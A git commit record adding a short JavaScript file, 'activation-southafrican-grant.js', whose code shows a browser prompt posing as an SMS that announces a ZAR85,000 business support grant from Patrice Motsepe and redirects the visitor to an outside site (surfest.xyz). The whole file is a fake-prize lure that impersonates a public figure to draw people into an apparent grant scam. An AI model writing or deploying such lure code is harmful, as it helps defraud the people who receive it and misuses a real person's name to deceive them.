94f9a901b654002ea6972aa2c07df0f44c038ec5
inemitid <asuquodavid021@gmail.com>
2025-05-29 13:02:18 -0700

    Create activation-southafrican-grant.js

---
+++ activation-southafrican-grant.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ZAR85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ZAR85,000 Business Support Grant from Patrice Motsepe, Press Ok to withdraw cash Now ','WITHDRAW ZAR85,000');
+if (password != 'WITHDRAW ZAR85,000') {
+location.href='https://surfest.xyz/southafrican-grant.html';
+}
